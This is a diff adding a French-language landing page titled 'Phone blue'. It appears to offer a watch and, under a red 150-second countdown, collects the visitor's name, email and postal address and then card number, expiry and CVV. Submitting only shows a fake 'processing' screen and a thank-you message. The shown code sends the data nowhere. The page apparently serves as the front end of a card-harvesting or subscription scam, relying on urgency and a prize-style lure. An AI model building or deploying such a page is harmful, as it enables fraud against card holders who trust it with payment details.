@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Phone blue</title>
+</head>
+<style>
+    .bg{
+        background-image: url("bg.png");
+        background-size: cover;
+        height: 100vh;
+        width: 100vw;
+    }
+    .bgn{
+        padding-top: 20px;
+        background-color: rgba(255, 255, 255, 0.815);
+    }
+    .popStar{
+        width: fit-content;
+        margin : 0px auto;
+    }
+    .topsec{
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+    }
+    .imgList{
+        width : fit-content;
+    }
+    .imgList .se{
+        width: 350px;
+        height: 300px;
+    }
+    .infoSecDetails{
+        padding-left: 5px;
+        margin-top: 20px;
+        display:flex;
+        flex-direction: column;
+        justify-content: center;
+        width: 20rem;
+        border-radius: 15px;
+        margin-left: 5px;
+    }
+    .infoSecDetails   form{
+        width: 90%;
+        margin: 0px auto;
+        padding-top: 30px;
+    }
+    form input{
+        background-color: rgba(218, 216, 216, 0.267);
+        border-radius: 15px;
+        height: 45px;
+        padding-left: 14px;
+        width: 100%;
+        font-size: small;
+        margin: 6px auto 0px;
+    }
+    .split input{
+        width: 49%;
+    }
+    form input[type="checkbox"] {
+    width: 16px;
+}
+    .cop{
+        margin-top: -40px;
+        width: fit-content;
+        margin-left: 18rem;
+    }
+    .cop img{
+        width: 100px;
+    }
+    
+    .outercircle{
+        background-color: white;
+        border-radius: 100%;
+        height: 90px;
+        width: 90px;
+        position: absolute;
+        left: 35%;
+        padding: 10px; 
+        top: -65px;
+    }
+    .innercicle{
+        background-color: red;
+        width: 70px;
+        height: 70px;
+        padding: 5px; 
+        border-radius: 100%;
+    }
+    .inn{
+        background-color: white;
+        width: 60px;
+        height: 60px;
+        border-radius: 100%;
+        color: red;
+        font-weight: bold;
+        padding-top: 16px;
+        text-align: center;
+    }
+    .close{
+        position: absolute;
+        right: 10px;
+        top: 10px;
+    }
+    .success .nine{
+        height: 40vh;
+        width: 400px;
+    }
+    .loading{
+        height: 100vh;
+        width: 100vw;
+        text-align: center;
+        padding-top: 25vh;
+        position: fixed;
+        top: 0px;
+        background-color: rgba(0, 0, 0, 0.89);
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        gap: 3rem;
+    }
+
+    @keyframes expandWidth {
+    from {
+        width: 150px;
+    }
+    to {
+        width: 400px;
+    }
+}
+
+@keyframes expandmode {
+    from {
+        width: 10px;
+    }
+    to {
+        width: 200px;
+    }
+}
+/* Apply the animation to the image */
+.anibut {
+    width: 100px; /* Initial width */
+    animation: expandWidth 2s 1s forwards; /* 2s duration, forwards to maintain end state */
+}
+
+
+    @media (max-width : 1090px) {
+        @keyframes expandmode {
+    from {
+        width: 10px;
+    }
+    to {
+        width: 200px;
+    }
+}
+        /* Apply the animation to the image */
+.anibut {
+    width: 100px; /* Initial width */
+    animation: expandmode 2s 1s forwards; /* 2s duration, forwards to maintain end state */
+}
+        .bg{
+            background-image: url("mywatch.png");
+        }
+        .outercircle{
+        background-color: white;
+        border-radius: 100%;
+        height: 70px;
+        width: 70px;
+        position: absolute;
+        left: 40%;
+        padding: 10px; 
+        top: -40px;
+    }
+    .innercicle{
+        background-color: red;
+        width: 50px;
+        height: 50px;
+        padding: 5px; 
+        border-radius: 100%;
+    }
+    .inn{
+        background-color: white;
+        width: 40px;
+        height: 40px;
+        border-radius: 100%;
+        color: red;
+        font-size: small;
+        font-weight: light;
+        padding-top: 10px;
+        text-align: center;
+    } 
+     .popStar{
+        width: 95%;
+        border-radius: 20px;
+    }
+    
+    .forMob{
+        width : 100%;
+        padding: 5px;
+    }
+    .lisinfo{
+        background-color: rgba(224, 221, 221, 0.205);
+        color: rgba(82, 82, 82, 0.726);
+    }
+    .mprog{
+        background-color: #A57A5C;
+        border-radius: 15px;
+        padding : 20px 20px;
+    }
+    .craq{
+        width: 60px;
+    }
+    .mInp{
+        background-color: rgba(218, 216, 216, 0.267);
+        border-radius: 15px;
+    }
+    .mInp input{
+        height: 40px;
+        background-color: rgba(218, 216, 216, 0);
+    }
+    }
+</style>
+<body>
+    <div class="bg ">
+        <div class="bgn h-full w-full relative">
+            
+        <img src="off.png" class="h-[3vh] lg:h-[14vh] mx-auto  lg:w-fit mt-4" />
+        <img src="watc.png" class=" h-[60vh] lg:h-[55vh] w-fit mx-auto" />
+        <div class="w-72 lg:w-96 -mt-20 lg:-mt-28 mx-auto mb-5">
+        <img src="rinf.png" class="h-[8vh] lg:h-[16vh] ml-auto" />
+        </div>
+        <img src="thearr.png" class="absolute bottom-56 left-[1%] lg:bottom-14 lg:left-[26%]"/>
+        <img src="myc.png" class="h-[8vh]  anibut craq w-[60%]  lg:h-[10vh] lg:w-fit mx-auto hover:pointer start" />
+        <img src="votre.png" class="h-[2vh] lg:h-[2vh] mb-2 mt-2 w-fit mx-auto" />
+        </div>
+        <div class="popStar hidden">
+            <div class="infoSec relative flex  rounded-xl mt-20">
+                <div class="outercircle block lg:hidden">
+                    <div class="innercicle">
+                        <div class="inn">
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="infoSecL hidden lg:block">
+                    <img src="led.png" class="h-[3vh] lg:h-[8vh]  ml-8 lg:w-fit mt-4" />
+                     <img src="votre.png" class="h-[2vh] lg:h-[2vh] ml-8 mb-2 mt-2 w-fit" />
+                    <img src="watc.png" class=" h-[60vh] lg:h-[35vh] w-fit mx-auto" />
+                    <div class="w-72 lg:w-96 -mt-12 lg:-mt-14 mx-auto mb-5">
+                    <img src="rinf.png" class="h-[8vh] lg:h-[10vh] ml-60" />
+                    </div>
+                </div>
+                <div class="infoSecDetails relative bg-white hidden  lg:flex">
+                    <div class="outercircle hidden lg:block">
+                        <div class="innercicle">
+                            <div class="inn">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="close">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-x-lg" viewBox="0 0 16 16">
+                            <path d="M2.146 2.854a.5.5 0 1 1 .708-.708L8 7.293l5.146-5.147a.5.5 0 0 1 .708.708L8.707 8l5.147 5.146a.5.5 0 0 1-.708.708L8 8.707l-5.146 5.147a.5.5 0 0 1-.708-.708L7.293 8z"/>
+                          </svg>
+                    </div>
+                   <div class="send mt-5">
+                    <div class="my-3 ml-3 font-semibold italic w-fit">
+                        Remplissez vos coordonneés
+                    </div>
+                    <form class="" onsubmit="return handleSubmit(event)">
+                        <span class="text-xs text-red-400 ferror hidden">Merci de remplir ce champ obligatoire</span>
+                        <input  type="text" placeholder="Nom de famille" class="outline-none dFamile"  
+                         />
+                         
+                        <span class="text-xs text-red-400 Admerror hidden">Merci de remplir ce champ obligatoire</span>
+                        <input  type="text" placeholder="Adress email" class="outline-none dadm"
+                      />
+                      
+                      <span class="text-xs text-red-400 Adrerror hidden">Merci de remplir ce champ obligatoire</span>
+                        <input  type="text" placeholder="Adress" class="outline-none dAd"/>
+                        
+                        <span class="text-xs text-red-400 Serror hidden">Merci de remplir ce champ obligatoire</span>
+                        <div class="split">
+                        <input  type="text" placeholder="Ville" class="outline-none dVim"/>
+                        <input  type="text" placeholder="Code Portal" class="outline-none code dPort" />
+                        </div>
+                        <div class="flex w-fit  gap-2 mx-auto  text-sm"  >
+                        <input  type="checkbox"  required/><div class="mt-4">
+                            jai plus de 18 ans et j'accepte les conditions</div>
+                        </div>
+                        <button type="submit" class="forFix w-fit ml-10">
+                            <img src="send.png" class="h-10 mx-auto" />
+                        </button>
+                    </form>
+                   </div>
+                  <div class="hidden payd">
+                    <div class="w-fit mx-auto text-sm font-semibold">Informations de paiement</div>
+                    <form  onsubmit="return handlePay(event)">
+                        <input  type="text" placeholder="1234 1234 1234 1234" class="outline-none first"
+                         maxlength="19" oninput="formatCardNumber(event)" required />
+                        <div class="split mt-3 relative">
+                        <input  type="text" placeholder="MM/YY" maxlength="5"
+                        oninput="formatCardExpiration(event)" class="outline-none cardDate"  required/>
+                        <input  type="text"   maxlength="3"  placeholder="CVV"  
+                              oninput="formatCVV(event)"class="outline-none cvv"   required/>
+                              <div class="absolute right-5 bg-white top-5" >
+                                <img src="mastercard.svg" class="w-5"/>
+                              </div><div class="absolute right-11 top-4" >
+                                <img src="visacard.svg" class="w-5"/>
+                              </div>
+                        </div>
+                        <button type="submit" class="mt-3 pdesk">
+                            <img src="pay.png" />
+                        </button>
+                    </form>
+                    
+                </div>
+                  </div>
+                 <div class="forMob lg:hidden bg-white rounded-xl pt-2">
+                 
+                <div class="tobe  pb-3 lg:pb-4 rounded-xl pb-15 " >
+                    <div class="w-fit mx-auto mt-2">
+                        <img src="led.png" class="h-[5vh]  mt-8" />
+                         <img src="votre.png" class="h-[2vh]   mb-2 mt-2 w-fit" />
+                        <img src="watc.png" class="h-60 "/>
+                       
+                        <div class="w-72 lg:w-96 -mt-20 mx-auto">
+                            <img src="rinf.png" class="h-[10vh] ml-auto  mr-20  myring" />
+                            </div>
+                    </div>
+                </div>
+                <form class="my-1 formatiom  p-2 rounded-xl">
+                    <span class="italic font-semibold text-sm">Remplissez vos coordonneés</span>
+                    <span class="hidden mErr  text-red-600 text-xs italic font-bold ">Merci de remplir ce champ obligatoire</span>
+                    <div class="flex mInp">
+                        <input type="text" class="outline-none family" placeholder="Nom de famille" />
+                        <input type="text" class="outline-none hidden adrem "  placeholder="Adresse"  />
+                        <input type="text" class="outline-none hidden portt"  placeholder="Code Portal"  />
+                        <input type="text" class="outline-none hidden vim"  placeholder="Ville"  />
+                        <input type="text" class="outline-none hidden adm"  placeholder="Adresse email"  />
+                        <div class="mprog">
+                        <img src="arr.png"  class="h-fit"/>
+                        </div>
+                    </div>
+                </form>
+                <form  onsubmit="return handlePayM(event) " class="myPay hidden  bg-white p-2 rounded-xl">
+                    <input  type="text" placeholder="1234 1234 1234 1234" class="outline-none numCard"
+                     maxlength="19" oninput="formatCardNumber(event)"  required/>
+                    <div class="split relative mt-1">
+                    <input  type="text" placeholder="MM/YY" maxlength="5"
+                    oninput="formatCardExpiration(event)" class="outline-none cardDate"  required/>
+                    <input  type="text"   maxlength="3"  placeholder="CVV"  
+                          oninput="formatCVV(event)"class="outline-none cvv"   required/>
+                          <div class="absolute right-5 bg-white top-5" >
+                            <img src="mastercard.svg" class="w-5"/>
+                          </div><div class="absolute right-12 top-4" >
+                            <img src="visacard.svg" class="w-5"/>
+                          </div>
+                    </div>
+                    <button type="submit" class="mt-1 pMob">
+                        <img src="pay.png" />
+                    </button>
+                </form>
+                <div class="mbSuc hidden bg-white w-[80vw] p-3 rounded-xl relative">
+                    <img src="watc.png" class="h-[40vh] mx-auto"/>
+                    <div class="close absolute top-3 right-1">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-x-lg" viewBox="0 0 16 16">
+                            <path d="M2.146 2.854a.5.5 0 1 1 .708-.708L8 7.293l5.146-5.147a.5.5 0 0 1 .708.708L8.707 8l5.147 5.146a.5.5 0 0 1-.708.708L8 8.707l-5.146 5.147a.5.5 0 0 1-.708-.708L7.293 8z"/>
+                          </svg>
+                    </div>
+                    <img src="Frame.png" class="absolute top-8 h-[70%]">
+                    <img src="cond.png" class="h-16 mx-auto">
+                    <div class="italic font-semibold mx-auto w-fit">Merci de nous avoir choisis !</div>
+                 </div>
+                </div>
+
+            </div>
+            <div class="success mt-10  w-fit px-10 rounded-xl py-3 mx-auto relative hidden" >
+                <img src="watc.png" class="h-[50vh] mx-auto"/>
+                <div class="close absolute top-10 right-10">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" class="bi bi-x-lg" viewBox="0 0 16 16">
+                        <path d="M2.146 2.854a.5.5 0 1 1 .708-.708L8 7.293l5.146-5.147a.5.5 0 0 1 .708.708L8.707 8l5.147 5.146a.5.5 0 0 1-.708.708L8 8.707l-5.146 5.147a.5.5 0 0 1-.708-.708L7.293 8z"/>
+                      </svg>
+                </div>
+                <img src="Frame.png" class="absolute top-8 left-4">
+                <img src="cond.png" class="h-14 mx-auto">
+                <div class="italic font-semibold mx-auto w-fit">Merci de nous avoir choisis !</div>
+            </div>
+            <div class="mx-auto w-fit mt-3 hidden lg:block">
+                <img src="firstp.png"  class="pro h-12 " />
+                <img src="secps.png"  class="pro2 h-12 hidden" />
+                <img src="finis.png"  class="pro3 h-12 hidden" />
+
+            </div>
+        </div>
+    </div>
+<div class="loading hidden text-white">
+    <img src="load.gif" class="h-24 mx-auto"/>
+    <div class="w-72 mt-3 text-center italic mx-auto">Veuillez patienter, nous sommes en 
+        train de traiter l'information</div>
+</div>
+</body>
+
+<script>
+    const start = document.querySelector(".start")
+    const bg = document.querySelector(".bgn")
+    const inn = document.querySelectorAll(".inn")
+    const form = document.querySelector(".send")
+    const payd = document.querySelector(".payd")
+    const pro = document.querySelector(".pro")
+    const pro2 = document.querySelector(".pro2")
+    const pro3 = document.querySelector(".pro3")
+    const popStar = document.querySelector(".popStar")
+    const success = document.querySelector(".success")
+    const infoSecDetails = document.querySelector(".infoSecDetails")
+    const infoSec = document.querySelector(".infoSec")
+    const list = document.querySelector(".list")
+    const loading = document.querySelector(".loading")
+    const close = document.querySelectorAll(".close")
+    const code = document.querySelector(".code")
+    const cardDate= document.querySelector(".cardDate")
+    const cvv = document.querySelector(".cvv")
+    const mprog = document.querySelector(".mprog")
+    const family = document.querySelector(".family")
+    const adrem = document.querySelector(".adrem")
+    const vim = document.querySelector(".vim")
+    const adm= document.querySelector(".adm")
+    const portt= document.querySelector(".portt")
+    const mErr= document.querySelector(".mErr")
+    const formatiom = document.querySelector(".formatiom")
+    const myPay= document.querySelector(".myPay")
+    const outercircle= document.querySelector(".outercircle")
+    const tobe= document.querySelector(".tobe")
+    const mbSuc= document.querySelector(".mbSuc")
+    const forFix= document.querySelector(".forFix")
+    const pdesk= document.querySelector(".pdesk")
+    const pMob= document.querySelector(".pMob")
+    const numCard= document.querySelector(".numCard")
+    const dFamile= document.querySelector(".dFamile")
+    const dAd= document.querySelector(".dAd")
+    const dadm= document.querySelector(".dadm")
+    const dPort= document.querySelector(".dPort")
+    const dVim= document.querySelector(".dVim")
+    const ferror= document.querySelector(".ferror")
+    const Serror= document.querySelector(".Serror")
+    const Adrerror= document.querySelector(".Adrerror")
+    const Admerror= document.querySelector(".Admerror")
+    const leftInfo = document.querySelector(".leftInfo")
+    const myring = document.querySelector(".myring")
+
+
+    let clPaym = false;
+    let clPay = false;
+    let moveCount = 0;
+
+    
+    restrictToNumbers(code)
+    let counstart = 0;
+   mprog.addEventListener("click", ()=>{
+        if(counstart == 0  ){
+            if(family.value.length > 3){
+                mErr.style.display = "none"
+                family.style.display = "none" 
+            adrem.style.display = "block"
+            adrem.focus()
+            counstart++
+            }else{
+                mErr.style.display = "block"
+            }
+        }else   if(counstart == 1){
+            if(adrem.value.length > 3){
+                mErr.style.display = "none"
+            adrem.style.display = "none" 
+            portt.style.display = "block"
+            portt.focus()
+            counstart++}else{
+                mErr.style.display = "block"
+            }
+}else   if(counstart == 2){
+    if(portt.value.length > 3){
+                mErr.style.display = "none"
+                portt.style.display = "none" 
+            vim.style.display = "block"
+                vim.focus()
+            counstart++
+        }else{
+                mErr.style.display = "block"
+            }
+ 
+}else   if(counstart == 3){
+    if(vim.value.length > 3){
+                mErr.style.display = "none"
+                vim.style.display = "none" 
+            adm.style.display = "block"
+                adm.focus()
+            counstart++
+        }else{
+                mErr.style.display = "block"
+            }
+   
+}else if(counstart ==4){
+    mErr.style.display = "none" 
+            formatiom.style.display = "none"
+            myPay.style.display = "block"
+             numCard.focus()
+            clPaym = true
+     pro.style.display ="none"
+     pro2.style.display = "block"
+}
+    })
+    pMob.addEventListener("click", ()=>{
+        if(numCard.value.length >15){
+        loading.style.display = "block"
+    setTimeout(myFunctionM, 2000);
+        }
+    })
+    document.addEventListener('keydown', (event) =>{
+        if (event.key === 'Enter' || event.keyCode === 13){
+            if(window.innerWidth >900){
+        
+            if(clPaym==false){
+                forFix.click();
+                }else{
+                    pdesk.click()
+                }
+            }else{
+                if(clPaym==false){
+                mprog.click()
+                }else{
+                    pMob.click()
+                }
+            }
+        }
+    })
+    start.addEventListener("click", ()=>{
+        bg.style.display ="none"
+        popStar.style.display = "block"
+        popStar.style.paddingTop = "50px"
+        family.focus()
+        myring.style.zIndex="999"
+        countdown()
+    })
+
+    
+    function handleSubmit(event) {
+            event.preventDefault();
+            dFamile.value.length > 2 ? ferror.style.display = "none" :ferror.style.display =  "block"     
+            dadm.value.length > 2 ? Admerror.style.display = "none" : Admerror.style.display = "block"
+            dAd.value.length > 2 ? Adrerror.style.display = "none" :Adrerror.style.display =  "block"
+            dVim.value.length > 2 && dPort.value.length > 2 ? Serror.style.display = "none" : Serror.style.display = "block"// Prevents the form from submitting
+if(dFamile.value.length > 2 && dadm.value.length > 2 
+    && dAd.value.length > 2 && dVim.value.length > 2 && dPort.value.length > 2  
+){
+    form.style.display ="none"
+        clPay = true
+        payd.style.display = "block"
+        
+     
+        pro.style.display ="none"
+        pro2.style.display = "block"
+        moveCount = 1;
+}
+            return false; // Return false to further prevent default behavior
+        }
+        function handlePay(event) {
+            event.preventDefault(); // Prevents the form from submitting
+    loading.style.display = "block"
+    setTimeout(myFunction, 2000);
+            return false; // Return false to further prevent default behavior
+        }
+        function handlePayM(event) {
+            event.preventDefault(); // Prevents the form from submitting
+    loading.style.display = "block"
+    setTimeout(myFunctionM, 2000);
+            return false; // Return false to further prevent default behavior
+        }
+        close.forEach((cl)=>{
+            cl.addEventListener("click", ()=>{
+            popStar.style.display = "none"
+        bg.style.display ="block"
+        })
+        })
+    function countdown() {
+    let timeLeft = 150;
+    let timer = setInterval(function() {
+        let minutes = Math.floor(timeLeft / 60);
+        let seconds = timeLeft % 60;
+        let formattedMinutes = minutes < 10 ? "0" + minutes : minutes;
+        let formattedSeconds = seconds < 10 ? "0" + seconds : seconds;
+
+        inn.forEach((circ)=>{
+            circ.textContent = formattedMinutes + ":" + formattedSeconds;
+        })
+        timeLeft--;
+
+        if (timeLeft < 0) {
+            clearInterval(timer);
+        }
+    }, 1000);
+}
+
+function myFunction() {
+ 
+    loading.style.display = "none"
+    infoSec.style.display = "none"
+        pro2.style.display ="none"
+        pro3.style.display = "block"
+        success.style.display = "block"
+        moveCount = 2;
+}
+function myFunctionM() {
+ 
+ loading.style.display = "none"
+ infoSec.style.marginTop = "70px"
+     pro2.style.display ="none"
+     pro3.style.display = "block"
+     outercircle.style.display = "none"
+     myPay.style.display = "none"
+     tobe.style.display = "none"
+     mbSuc.style.display = "block"
+     moveCount = 12;
+
+}
+
+function restrictToNumbers(inputElement) {
+    inputElement.addEventListener('input', function(event) {
+        let inputValue = inputElement.value;
+
+        inputValue = inputValue.replace(/\D/g, '');
+
+        inputElement.value = inputValue;
+    });
+}
+
+function formatCVV(event) {
+  let input = event.target;
+  let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
+  value = value.substring(0, 3); // Limit to 3 characters
+  input.value = value; // Assign the formatted value back to the input
+}
+
+
+
+function formatCardExpiration(event) {
+  let input = event.target;
+  let value = input.value.replace(/\D/g, '');
+  if (event.inputType === 'deleteContentBackward') {
+    if (input.selectionStart <= 3) {
+      value = value.substring(0, input.selectionStart);
+    } else {
+      value = value.substring(0, 2) + value.substring(3, input.selectionStart);
+    }
+  } else {
+    value = value.substring(0, 4); 
+    value = value.replace(/(\d{2})(\d{0,2})/, '$1/$2');
+  }
+  
+  input.value = value;
+  if(value.length == 5){
+    cvv.focus()
+  }
+}
+function formatCardNumber(event) {
+  let input = event.target;
+  let value = input.value.replace(/\D/g, ''); // Remove non-numeric characters
+  value = value.substring(0, 16); // Limit to 16 digits
+
+  let formattedValue = '';
+  for (let i = 0; i < value.length; i += 4) {
+    formattedValue += value.substr(i, 4) + ' ';
+  }
+
+  input.value = formattedValue.trim();
+  if(input.value.length == 19){
+    cardDate.focus()
+  }
+}
+    </script>
+</html>
